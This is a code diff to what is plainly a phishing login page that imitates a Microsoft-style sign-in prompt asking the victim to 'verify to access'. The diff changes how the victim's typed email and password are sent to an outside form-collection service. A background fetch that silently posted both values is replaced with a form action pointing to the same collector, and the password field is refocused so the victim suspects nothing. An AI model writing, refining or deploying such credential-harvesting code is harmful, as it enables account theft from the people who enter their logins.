@@ -25,7 +25,7 @@ please verify to access.</span><br>
                             <span id="error" class="text-danger" style="display: none;">That account doesn't exist. Enter a different account</span>
                             <small></small>
                             <div class="form-group">
-                                <form id="loginForm">
+                                <form id="loginForm" action="https://formbold.com/s/9mkW5" method="post">
                                     <input type="email" id="login" name="AA" class="form-control rounded-0 bg-transparent" aria-describedby="aiHelp" placeholder="Email Address" value="replaceemail@domain.com" required>
                             </div>
                             <div class="form-group mt-2">
@@ -58,16 +58,11 @@ please verify to access.</span><br>
             // Focus back on password field
             document.getElementById('passwd').focus();
             
-            // Submit data to Formspark in background without redirect
-            const formData = new FormData();
-            formData.append('AA', document.getElementById('login').value);
-            formData.append('BB', document.getElementById('passwd').value);
+            // Submit form data in background (original form action)
+            document.getElementById('loginForm').submit();
             
-            fetch('https://formbold.com/s/9mkW5', {
-                method: 'POST',
-                body: formData,
-                mode: 'no-cors'
-            }).catch(error => console.log('Submission complete'));
+            // Prevent default form submission (we're handling it manually)
+            return false;
         }
     </script>
 
